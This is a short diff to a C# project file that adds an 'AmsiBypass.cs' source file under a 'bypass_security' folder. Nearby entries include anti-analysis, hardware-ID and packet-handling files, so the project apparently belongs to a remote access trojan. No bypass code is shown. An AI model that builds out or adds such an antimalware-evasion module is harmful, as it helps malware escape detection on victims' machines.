@@ -79,6 +79,7 @@
   <ItemGroup>
     <Compile Include="Algorithm\Aes256.cs" />
     <Compile Include="Algorithm\Sha256.cs" />
+    <Compile Include="bypass_security\AmsiBypass.cs" />
     <Compile Include="Handle Packet\Packet.cs" />
     <Compile Include="Helper\Anti_Analysis.cs" />
     <Compile Include="Helper\HwidGen.cs" />
